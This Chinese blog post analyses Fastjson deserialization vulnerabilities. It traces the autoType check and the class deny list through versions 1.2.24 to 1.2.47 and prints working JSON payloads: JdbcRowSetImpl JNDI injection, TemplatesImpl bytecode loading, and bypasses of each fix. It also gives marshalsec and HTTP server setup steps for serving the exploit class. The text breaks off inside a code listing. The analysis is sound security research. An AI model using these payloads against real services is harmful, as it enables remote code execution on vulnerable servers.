---
typora-root-url: ../../../static
title: "Fastjson反序列化攻击"
date: 2021-07-04T17:07:36+08:00
draft: false
categories: ["security"]
---

## FastJson API介绍

FastJson的常见API如下所示：

- JSON.toJSONString(Object)：将对象序列化成JSON字符串；
- JSON.parse(String)：将JSON字符换反序列化成Object对象；
- JSON.parseObject(String)：将JSON字符串反序列化成JSONObject对象；
- JSON.parseObject(String, Class)：将JSON字符串反序列化成Class实参对应的类对象；

## FastJson测试

先说结论，便于理解（FastJson Version <= 1.2.24）：

- FastJson会根据 `@type` 指定的类去进行反序列化；
- FastJson反序列化过程中，会调用反序列化对象的setter方法进行赋值，并且如果属性是public权限，没有setter方法，也会被赋值；
- FastJson默认不会反序列化private权限的属性，除非指定开启 `Feature.SupportNonPublicField` 特性；

首先准备一个Java POJO，需要注意，以下的测试均基于FastJson Version 1.2.10：

```java
/**
 * @author : p1n93r
 * @date : 2021/8/2 13:13
 * 一个简单的用于测试FastJson反序列化的pojo
 */
public class User {
    /**
     * 私有属性，有getter&setter方法
     */
    private String name;

    /**
     * 共有属性，无getter&setter方法
     */
    public int age;

    /**
     * 私有属性，无getter&setter方法
     */
    private String info;

    /**
     * 公有属性，有getter&setter方法
     */
    public String address;

    public User() {
        System.out.println("call User default Constructor");
    }

    public String getName() {
        System.out.println("call User getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("call User setName");
        this.name = name;
    }

    public String getAddress() {
        System.out.println("call User getAddress");
        return address;
    }

    public void setAddress(String address) {
        System.out.println("call User setAddress");
        this.address = address;
    }

    @Override
    public String toString() {
        return "User{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", address='" + address + '\'' +
                ", info='" + info + '\'' +
                '}';
    }
}
```

然后运行如下测试代码：

```java
/**
 * @author : p1n93r
 * @date : 2021/8/2 13:16
 * 测试FastJson反序列化的逻辑
 */
public class Main {
    public static void main(String[] args) {
        //序列化
        String jsonString = "{\"@type\":\"com.pinger.javasec.fastjson.User\",\"name\":\"pinger\",\"address\":\"QT\",\"info\":\"QT Security Researcher\",\"age\":\"3\"}";
        System.out.println("jsonString=" + jsonString);

        System.out.println("-----------------------------------------------\n\n");
        //通过parse方法进行反序列化，返回的是@type指定的类对象
        System.out.println("JSON.parse(String)：");
        Object obj1 = JSON.parse(jsonString);
        System.out.println("parse反序列化对象名称:" + obj1.getClass().getName());
        System.out.println("parse反序列化：" + obj1);
        System.out.println("-----------------------------------------------\n");

        //通过parseObject,不指定类，返回的是一个JSONObject
        System.out.println("JSON.parseObject(String)：");
        Object obj2 = JSON.parseObject(jsonString);
        System.out.println("parseObject反序列化对象名称:" + obj2.getClass().getName());
        System.out.println("parseObject反序列化:" + obj2);
        System.out.println("-----------------------------------------------\n");

        //通过parseObject,指定为object.class
        System.out.println("JSON.parseObject(String, Class)：");
        Object obj3 = JSON.parseObject(jsonString, Object.class);
        System.out.println("parseObject反序列化对象名称:" + obj3.getClass().getName());
        System.out.println("parseObject反序列化:" + obj3);
        System.out.println("-----------------------------------------------\n");

        //通过parseObject,指定为User.class
        System.out.println("JSON.parseObject(String, Class)：");
        Object obj4 = JSON.parseObject(jsonString, User.class);
        System.out.println("parseObject反序列化对象名称:" + obj4.getClass().getName());
        System.out.println("parseObject反序列化:" + obj4);
        System.out.println("-----------------------------------------------\n");
    }
}
```

得到如下运行结果：

```java
jsonString={"@type":"com.pinger.javasec.fastjson.User","name":"pinger","address":"QT","info":"QT Security Researcher","age":"3"}
-----------------------------------------------

JSON.parse(String)：
call User default Constructor
call User setName
call User setAddress
parse反序列化对象名称:com.pinger.javasec.fastjson.User
parse反序列化：User{name='pinger', age=3, address='QT', info='null'}
-----------------------------------------------

JSON.parseObject(String)：
call User default Constructor
call User setName
call User setAddress
call User getAddress
call User getName
parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:{"name":"pinger","age":3,"address":"QT"}
-----------------------------------------------

JSON.parseObject(String, Class)：
call User default Constructor
call User setName
call User setAddress
parseObject反序列化对象名称:com.pinger.javasec.fastjson.User
parseObject反序列化:User{name='pinger', age=3, address='QT', info='null'}
-----------------------------------------------

JSON.parseObject(String, Class)：
call User default Constructor
call User setName
call User setAddress
parseObject反序列化对象名称:com.pinger.javasec.fastjson.User
parseObject反序列化:User{name='pinger', age=3, address='QT', info='null'}
-----------------------------------------------
```

首先我们看到 `JSON.parse(String)` 的运行结果：

```java
JSON.parse(String)：
call User default Constructor
call User setName
call User setAddress
parse反序列化对象名称:com.pinger.javasec.fastjson.User
parse反序列化：User{name='pinger', age=3, address='QT', info='null'}
```

可以看到，FastJson反序列化JSON字符串，如果存在 `@type` ，则首先会调用 `@type` 指定的类的构造器，然后调用属性的setter方法。对于public权限的属性age，虽然没有对应的setter方法，但是也最终赋值成功了。而private权限的属性info，同样也没有对应的setter方法，但是最终没有赋值成功。最终得到的对象是 `@type` 指定的类对象。

不过在1.2.22, 1.1.54.android之后，增加了一个 `SupportNonPublicField` 特性，如果使用了这个特性，那么private权限的info属性就算没有setter也能成功赋值。

接下来观察 `JSON.parseObject(String)` 的结果：

```java
JSON.parseObject(String)：
call User default Constructor
call User setName
call User setAddress
call User getAddress
call User getName
parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:{"name":"pinger","age":3,"address":"QT"}
```

可以看到，如果存在 `@type` ，则首先会调用 `@type` 指定的类的构造器，然后调用各个属性的setter方法进行赋值。但是这里与 `JSON.parse(String)` 不同的是，这里还额外调用了属性的getter方法。最终反序列化得到的对象类型为 `JSONObject` 类型。

至于为什么会额外调用属性的getter方法，原因是 `JSON.parseObject(String)` 其实是对 `JSON.parse(String)` 的一层封装，调用了 `JSON.toJSON(Object)` 方法，这个方法会调用对象的getter方法：

```java
public static JSONObject parseObject(String text) {
    Object obj = parse(text);
    if (obj instanceof JSONObject) {
        return (JSONObject) obj;
    }

    return (JSONObject) JSON.toJSON(obj);
}
```

然后看到 `JSON.parseObject(String, Class)` ，且指定Class为Object.class的结果：

```java
JSON.parseObject(String, Class)：
call User default Constructor
call User setName
call User setAddress
parseObject反序列化对象名称:com.pinger.javasec.fastjson.User
parseObject反序列化:User{name='pinger', age=3, address='QT', info='null'}
```

结果和 `JSON.parse(String)` 是一样的，也就是当指定Class为Object.class时，会根据 `@type` 指定的值自动反序列化成对应的类。

最后看到 `JSON.parseObject(String, Class)` ，且指定Class为User.class的结果：也和 `JSON.parse(String)` 是一样的。这个很好理解，使用 `@type` 指明了需要反序列化后的类型。

我们将FastJson的版本切换到1.2.25再次运行一下，会提示如下报错：

```java
Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. com.pinger.javasec.fastjson.User
	at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:882)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)
	at com.alibaba.fastjson.JSON.parse(JSON.java:137)
	at com.alibaba.fastjson.JSON.parse(JSON.java:128)
	at com.pinger.javasec.fastjson.Main.main(Main.java:19)
```

提示不支持 `autoType` ，这是因为从1.2.25开始，FastJson默认关闭 `autoType` 了，并且从1.2.25开始，增加了 `checkeAutoType()` 函数对 `@type` 指定的类进行基于白名单和黑名单的检查。

`ParseConfig#checkAutoType(String, Class<?>)` 中白名单加黑名单的检查逻辑代码如下：

```java
if (autoTypeSupport || expectClass != null) {
    for (int i = 0; i < acceptList.length; ++i) {
        String accept = acceptList[i];
        if (className.startsWith(accept)) {
            return TypeUtils.loadClass(typeName, defaultClassLoader);
        }
    }

    for (int i = 0; i < denyList.length; ++i) {
        String deny = denyList[i];
        if (className.startsWith(deny)) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }
}
```

可以看到，首先是进行白名单检查，如果在白名单中，则直接返回。如果不在，再继续进行黑名单检查，如果在黑名单中，则直接抛出异常。

1.2.25版本的黑名单如下：

```java
0 = "bsh"
1 = "com.mchange"
2 = "com.sun."
3 = "java.lang.Thread"
4 = "java.net.Socket"
5 = "java.rmi"
6 = "javax.xml"
7 = "org.apache.bcel"
8 = "org.apache.commons.beanutils"
9 = "org.apache.commons.collections.Transformer"
10 = "org.apache.commons.collections.functors"
11 = "org.apache.commons.collections4.comparators"
12 = "org.apache.commons.fileupload"
13 = "org.apache.myfaces.context.servlet"
14 = "org.apache.tomcat"
15 = "org.apache.wicket.util"
16 = "org.codehaus.groovy.runtime"
17 = "org.hibernate"
18 = "org.jboss"
19 = "org.mozilla.javascript"
20 = "org.python.core"
21 = "org.springframework"
```

再将FastJson的版本切换到1.2.42，发现从这个版本开始，黑名单和白名单不再已明文的形式写在源码中了，而是使用hashcode（10进制）进行替代，增大安全研究的难度（恶心心）：

![][p1]

将FastJson版本切换到1.2.61，这个版本中，将黑白名单的hashcode换成了16进制：

![][p2]

## FastJson反序列化EXP分析

### Version <= 1.2.24

从前面的分析可以知道，小于1.2.24版本的FastJson随便R，默认开启autoType且没有任何黑白名单防护。只要有Gadget就可以攻击成功。比较常见的EXP如下：

```java
// EXP 1，无需开启Feature.SupportNonPublicField
{
  "test": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:8080/Shell",
    "autoCommit": true
  }
}

// EXP 2，需要开启Feature.SupportNonPublicField
// 所以只支持：1.2.22<=version<=1.2.24 (1.2.22才开始支持Feature.SupportNonPublicField特性)
{
  "test": {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["Your Eval Class Bytecodes"],
    "_name": "p1n93r",
    "_tfactory": {},
    "_outputProperties": {}
  }
}
```

过一下这两个EXP叭，下面分析基于FastJson Version 1.2.24以及JDK8u66。

首先分析一下EXP 1。前面我们分析过，FastJson可以根据 `@type` 指定的类来进行反序列化，且会调用属性的setter方法。我们看到EXP：

```java
// EXP 1
{
  "test": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:8080/Shell",
    "autoCommit": true
  }
}
```

指定反序列化 `com.sun.rowset.JdbcRowSetImpl` 类对象，并且会调用 `setDataSourceName()` 和 `setAutoCommit()` 。

我们跟进 `setDataSourceName()` 方法，就是为属性dataSource赋值，代码如下所示：

```java
public void setDataSourceName(String var1) throws SQLException {
    if (this.getDataSourceName() != null) {
        if (!this.getDataSourceName().equals(var1)) {
            super.setDataSourceName(var1);
            this.conn = null;
            this.ps = null;
            this.rs = null;
        }
    } else {
        super.setDataSourceName(var1);
    }
}
// super.setDataSourceName(var1)代码：
public void setDataSourceName(String name) throws SQLException {

    if (name == null) {
        dataSource = null;
    } else if (name.equals("")) {
        throw new SQLException("DataSource name cannot be empty string");
    } else {
        dataSource = name;
    }

    URL = null;
}
```

然后跟进 `setAutoCommit()` 方法：

```java
public void setAutoCommit(boolean var1) throws SQLException {
    if (this.conn != null) {
        this.conn.setAutoCommit(var1);
    } else {
        this.conn = this.connect();
        this.conn.setAutoCommit(var1);
    }
}
```

继续跟进 `this.connect()` ，发现存在JNDI注入：

```java
private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

并且JNDI注入位置 `var1.lookup(this.getDataSourceName())` 中，其中的 `this.getDataSourceName()` 就是前面我们通过调用 `setDataSourceName()` 赋值的值，这个值可以被我们攻击者随意控制，也就是攻击者可以控制JNDI的lookup的地址，从而造成JNDI注入。

首先准备一个继承了ObjectFactory类的任意类，在其静态代码块中执行命令，并且将这个类编译成class文件，命名为Exploit.class，注意，这个类不能有package。

然后在Exploit.class文件所在的目录下起一个HTTP服务，使用python起HTTP服务的命令如下：

```bash
python3 -m http.server 80
// Or python2
python2 -m SimpleHTTPServer 80
```

最后使用marshallsec起一个RMIRefServer：

```bash
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/#Shell 1099
```

当靶机执行如下代码时，将会触发前面分析过的JNDI注入了，并且RCE成功：

```java
public static void exp1(){
    String exp="{\n" +
            "  \"test\": {\n" +
            "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
            "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
            "    \"autoCommit\": true\n" +
            "  }\n" +
            "}";
    JSON.parse(exp);
}
```

![][p3]

Gadget Chain如下：

![][p4]

然后分析一下EXP 2，首先看到EXP 2：

```java
// EXP 2
{
  "test": {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["Your Eval Class Bytecodes"],
    "_name": "p1n93r",
    "_tfactory": {},
    "_outputProperties": {}
  }
}
```

一些解释如下所示：

- _bytecodes：编译恶意类后得到的二进制class（需要继承AbstractTranslet）数据的base64编码字符串，需要继承 `AbstractTranslet` 类的原因主要是存在类型检查，检查失败会直接抛出异常，不能调用 `newInstance()` 实例化恶意类来触发RCE了；
- _name：不能为空，主要是为了 `TemplatesImpl#getTransletInstance()` 中能顺利往下执行，否则不能往下执行： `defineTransletClasses()` ;
- _tfactory：不能为空，主要是为了 `TemplatesImpl#defineTransletClasses()` 中能顺利往下执行，否则在有的JDK版本中无法往下执行： `loader.defineClass(_bytecodes[i])` ;
- _outputProperties：FastJson调用 `TemplatesImpl#getOutputProperties()` 时，会调用 `TemplatesImpl#newTransformer()` ，是整个Gadget的入口。

Gadget Chain如下：

1. TemplatesImpl#getOutputProperties()
2. TemplatesImpl#newTransformer()
3. TemplatesImpl#getTransletInstance()中的 `defineTransletClasses()` ;
4. TemplatesImpl#getTransletInstance()中的 `_class[_transletIndex].newInstance()` ;

前面我们分析过，基于Fastjson调用 `JSON.parse(String)` 会调用属性的setter方法为属性赋值，但是这个Gadget是如何做到调用 `_outputProperties` 属性的getter方法的呢？

主要原因是在 `JavaBeanInfo#build()` 中，对于getter返回值类型为Collection、Map、AtomicBoolean、AtomicInteger和AtomicLong的getter方法，会将其封装成fieldInfo，然后添加到fieldList中，后续会在 `FieldDeserializer#setValue()` 中调用fieldList中存储的fieldInfo对应的method。这里会成功将getOutputProperties方法封装成fieldInfo存入fieldList（因为其返回值类型Properties继承Map类），所以得以调用 `TemplatesImpl#getOutputProperties()` ;
### 1.2.25 <= Version <= 1.2.41

1.2.25之前fastjson默认开启autoType，但是从1.2.25开始默认关闭了autoType支持。并且新增了ParseConfig#checkAutoType方法进行黑白名单的检测。

注意，这个版本区间内的EXP，不是对autoType的绕过，可以说 **只是对ParseConfig#checkAutoType()内的黑白名单的绕过** 。也就是说，这个版本区间内，想攻击成功，必须得开启 **autoTypeSupport** 选项。

首先说明一下，以下两种情况不会进入到 `ParseConfig#checkAutoType()` ：

- JSON字符串未使用@type；
- @type与JSON.parseObject(String, Class)中的Class相同；

下面分四种不同的情况来分析 `ParseConfig#checkAutoType()` 的机制（基于1.2.25版本分析）：

| 情况 | autoTypeSupport是否开启 |          反序列化方式           |
| ---- | :---------------------: | :-----------------------------: |
| 1    |           否            |       JSON.parse(String)        |
| 2    |           否            | JSON.parseObject(String, Class) |
| 3    |           是            |       JSON.parse(String)        |
| 4    |           是            | JSON.parseObject(String, Class) |

#### 情况1

例如如下代码所示，属于情况1，没有手动开启 `autoTypeSupport` ：

```java
public static void normal()throws Exception{
    String userJson="{\"@type\":\"com.pinger.javasec.fastjson.User\",\"address\":\"QT\",\"age\":0,\"name\":\"p1n93r\"}";
    JSON.parse(userJson);
}
```

首先贴上 `ParseConfig#checkAutoType()` 源码：

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {
        return null;
    }

    final String className = typeName.replace('$', '.');

    if (autoTypeSupport || expectClass != null) {
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                return TypeUtils.loadClass(typeName, defaultClassLoader);
            }
        }

        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }

    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) {
        clazz = deserializers.findClass(typeName);
    }

    if (clazz != null) {
        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }

        return clazz;
    }

    if (!autoTypeSupport) {
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
        }
    }

    if (autoTypeSupport || expectClass != null) {
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
    }

    if (clazz != null) {

        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                ) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        if (expectClass != null) {
            if (expectClass.isAssignableFrom(clazz)) {
                return clazz;
            } else {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }
        }
    }
	// 情况1最终会进入到这里，抛出异常，无法反序列化
    if (!autoTypeSupport) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    return clazz;
}
```

首先，由于默认autoType关闭，且我们没有手动开启，又没有使用 `JSON.parseObject(String, Class)` 指定需要反序列化的类，所以expectClass也为null，所以这里会先进入 `if (!autoTypeSupport) {` 分支：

```java
if (!autoTypeSupport) {
    for (int i = 0; i < denyList.length; ++i) {
        String deny = denyList[i];
        if (className.startsWith(deny)) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }
    for (int i = 0; i < acceptList.length; ++i) {
        String accept = acceptList[i];
        if (className.startsWith(accept)) {
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

            if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }
            return clazz;
        }
    }
}
```

这里可以看到，就是先进的黑名单校验，如果匹配到了，则抛出异常。然后再进行白名单匹配，匹配到了则直接返回对应的Class对象。这里因为 `com.pinger.javasec.fastjson.User` 类不在黑名单中，也不在白名单中，所以会接着往下执行到如下代码，抛出异常：

```java
if (!autoTypeSupport) {
    throw new JSONException("autoType is not support. " + typeName);
}
```

#### 情况2

例如如下代码属于情况2，仍旧没有开启autoType，但是指定了expectClass为Attack类（不能是User类，因为这样就不会进入checkAutoType函数了）：

```java
public static void normal()throws Exception{
    String userJson="{\"@type\":\"com.pinger.javasec.fastjson.User\",\"address\":\"QT\",\"age\":0,\"name\":\"p1n93r\"}";
    JSON.parseObject(userJson,Attack.class);
}
```

这里因为 `expectClass` 的值不为空，所以会进入 `if (autoTypeSupport || expectClass != null) {` 分支：

```java
if (autoTypeSupport || expectClass != null) {
    for (int i = 0; i < acceptList.length; ++i) {
        String accept = acceptList[i];
        if (className.startsWith(accept)) {
            return TypeUtils.loadClass(typeName, defaultClassLoader);
        }
    }

    for (int i = 0; i < denyList.length; ++i) {
        String deny = denyList[i];
        if (className.startsWith(deny)) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }
}
```

可以看到，这里也是黑白名单检测，但是注意，这里是先进行白名单检测，再进行黑名单检测，如果白名单匹配到了，就直接返回Class了，不会再进行后续的黑名单检测。所以如果Gadget在白名单中，就可以直接利用了。这里因为className为User，不在黑名单中，也不在白名单中，所以最终会执行如下代码：

```java
if (autoTypeSupport || expectClass != null) {
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
}

if (clazz != null) {

    if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
            || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
            ) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    if (expectClass != null) {
        if (expectClass.isAssignableFrom(clazz)) {
            return clazz;
        } else {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }
    }
}
```

先load我们通过@type指定的User类，然后检测是否为 `ClassLoader` 和 `DataSource` 类（包括其子类），最后再检测@type指定的类，是否为 `expectClass` 对应的类（包括子类）， `expectClass` 的值由 `JSON.parseObject(String, Class)` 中的Class指定，我们前面指定为Attack类，所以这里会抛出异常：`throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName())` 。

#### 情况3

如下代码所示，手动开启autoType，且没有指定expectClass：

```java
public static void normal()throws Exception{
    String userJson="{\"@type\":\"com.pinger.javasec.fastjson.User\",\"address\":\"QT\",\"age\":0,\"name\":\"p1n93r\"}";
    // 手动开启autoType
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    JSON.parse(userJson);
}
```

这里因为开启了autoType，所以和情况2一样，会进入 `if (autoTypeSupport || expectClass != null) {` 分支，也就是进行先白后黑的检测，这里都不会被匹配到，所以继续往下执行到 `if (autoTypeSupport || expectClass != null) {` 分支：

```java
if (autoTypeSupport || expectClass != null) {
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
}
```

可以看到，这里会load我们@type指定的类，并且返回。回顾这个过程，我们要想到达这里，需要满足以下几个条件：

- @type指定的类，不能在黑名单内；
- @type指定的类，能成功被 `TypeUtils.loadClass` 加载；

这里我们1.2.25<=version<=1.2.41版本常见的Payload：

```java
/**
 * 1.2.25<=version<=1.2.41
 * 1.2.25开始默认关闭了autotype支持
 * 此EXP : Bypass checkAutoType()中的黑白名单校验，但是还是需要开启autoType
 */
public static void exp3()throws Exception{
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String exp="{\n" +
            "  \"test\": {\n" +
            "    \"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\n" +
            "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
            "    \"autoCommit\": true\n" +
            "  }\n" +
            "}";
    JSON.parse(exp);
}
```

这里看到@type指定的值为： `Lcom.sun.rowset.JdbcRowSetImpl;` ，这个类因为前面多了 `L` 字符，所以不在黑名单内，成功绕过了黑名单。但是这个类是如何被 `TypeUtils.loadClass` 加载的呢？我们直接看到 `TypeUtils.loadClass` 的源码片段：

```java
if (className == null || className.length() == 0) {
    return null;
}

Class<?> clazz = mappings.get(className);

if (clazz != null) {
    return clazz;
}

if (className.charAt(0) == '[') {
    Class<?> componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
}

if (className.startsWith("L") && className.endsWith(";")) {
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
}

try {
    if (classLoader != null) {
        clazz = classLoader.loadClass(className);
        mappings.put(className, clazz);

        return clazz;
    }
} catch (Throwable e) {
    e.printStackTrace();
    // skip
}
```

看到 `if (className.startsWith("L") && className.endsWith(";")) {` 分支：

```java
if (className.startsWith("L") && className.endsWith(";")) {
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
}
```

如果className以 `L` 开头，且以 `;` 结尾，则去掉首尾的这两个字符，然后在递归调用 `loadClass` 加载类，后续通过 `clazz = classLoader.loadClass(className);` 成功加载并返回。所以我们@type指定的类成功绕过黑名单后，还能被成功load，于是造成了反序列化漏洞。

#### 情况4

如下代码所示，手动开启autoType，且指定了expectClass为Attack.class：

```java
public static void normal()throws Exception{
    String userJson="{\"@type\":\"com.pinger.javasec.fastjson.User\",\"address\":\"QT\",\"age\":0,\"name\":\"p1n93r\"}";
    // 手动开启autoType
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    JSON.parseObject(userJson,Attack.class);
}
```

这里虽然能成功被 `TypeUtils.loadClass` 加载，但是因为存在expectClass，且expectClass和load后的Class不是同种类型，导致在如下地方抛出异常，不能正常返回Class：

```java
if (expectClass != null) {
    if (expectClass.isAssignableFrom(clazz)) {
        return clazz;
    } else {
        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
    }
}
```

#### 总结

这个版本区间（1.2.25<=version<=1.2.41）想要攻击成功（不考虑白名单），需要靶机开启autoType，且不能指定expectClass。也就是如下情况可以进行攻击：

```java
/**
 * 1.2.25<=version<=1.2.41
 * 1.2.25开始默认关闭了autotype支持
 * 此EXP : Bypass checkAutoType()中的黑白名单校验，但是还是需要开启autoType
 */
public static void exp3()throws Exception{
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String exp="{\n" +
            "  \"test\": {\n" +
            "    \"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\n" +
            "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
            "    \"autoCommit\": true\n" +
            "  }\n" +
            "}";
    JSON.parse(exp);
}
```

### Version 1.2.42

这个版本对1.2.25<=version<=1.2.41的黑名单绕过进行了修复，同时将明文的黑名单修改成了10进制，增加安全研究的难度。看到官方修复的Diff：

![][p5]

所以我们只需要双写首字符 `L` 和双写末字符 `;` ，截掉后仍然存在首字符 `L` 以及尾字符 `;` ，仍然可以绕过黑名单。所以这个版本的EXP如下（仍然需要开启autoType）：

```java
/**
 * version=1.2.42
 * 双写绕过1.2.25<=version<=1.2.41的修复
 */
public static void exp4()throws Exception{
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String exp="{\n" +
            "  \"test\": {\n" +
            "    \"@type\": \"LLcom.sun.rowset.JdbcRowSetImpl;;\",\n" +
            "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
            "    \"autoCommit\": true\n" +
            "  }\n" +
            "}";
    JSON.parse(exp);
}
```

### Version 1.2.43

这个版本对1.2.42进行了修复，首先看到官方的修复方法：

![image-20210805121625629](/media/image-20210805121625629.png)

所以双写LL不能绕过了。但是我们看到 `TypeUtils#loadClass` 存在如下代码：

```java
if(className.charAt(0) == '['){
    Class<?> componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
}
```

不仅仅 `L` 字符可以用来绕过，`[` 字符也可以绕过；所以就出现了如下EXP：

```java
/**
 * version=1.2.43
 * 使用 [ 字符绕过1.2.42的修复
 */
public static void exp5()throws Exception{
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String exp = "{\"test\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true]}}";
    JSON.parse(exp);
}
```

### 1.2.44 <= Version <= 1.2.45

从1.2.44开始，对1.2.43的漏洞进行了修复，首先看到1.2.44对1.2.43的修复：

![image-20210805133026054](/media/image-20210805133026054.png)

这个版本区间内，主要是一些黑名单绕过，所以自然也需要开启autoType。Payload后面流量分析章节中再给出。

### 1.2.46 <= Version <= 1.2.47

1.2.46主要是针对一些绕过加了一些黑名单：

![image-20210805133232417](/media/image-20210805133232417.png)

然后就出现了不需要开启autoType的绕过利用方式。首先看到payload：

```java
/**
 * 1.2.46 <= Version <= 1.2.47
 * 直接绕过autoType，无需开启autoType
 */
public static void exp7()throws Exception{
    String exp="{\"rand1\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"rand2\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Object\",\"autoCommit\":true}}";
    JSON.parse(exp);
}
```

可以看到，这个payload存在两个@type。对这两个@type的解释如下：

- 第一个@type：反序列化 `java.lang.Class` 的过程中，会加载 `com.sun.rowset.JdbcRowSetImpl` 这个Class，并且加入缓存；
- 第二个@type：在没有开启autoType的情况下，可以从缓存中拿 `com.sun.rowset.JdbcRowSetImpl` 这个Class，且不经过白加黑验证，后续就是正常的反序列化攻击链的流程了。

首先我们回顾一下 `TypeUtils#loadClass` 的如下代码：

```java
try{
    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
    if(contextClassLoader != null && contextClassLoader != classLoader){
        clazz = contextClassLoader.loadClass(className);
        if (cache) {
            mappings.put(className, clazz);
        }
        return clazz;
    }
} catch(Throwable e){
    // skip
}
```

成功加载Class后，由于cache默认为true，所以会调用 `mappings.put(className, clazz)` 将Class存入缓存中。我们再看到 `ParserConfig#checkAutoType` 的代码：

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
    if (typeName == null) {
        return null;
    }

    if (typeName.length() >= 128 || typeName.length() < 3) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    String className = typeName.replace('$', '.');
    Class<?> clazz = null;

    final long BASIC = 0xcbf29ce484222325L;
    final long PRIME = 0x100000001b3L;

    final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
    if (h1 == 0xaf64164c86024f1aL) { // [
        throw new JSONException("autoType is not support. " + typeName);
    }

    if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    final long h3 = (((((BASIC ^ className.charAt(0))
            * PRIME)
            ^ className.charAt(1))
            * PRIME)
            ^ className.charAt(2))
            * PRIME;

    if (autoTypeSupport || expectClass != null) {
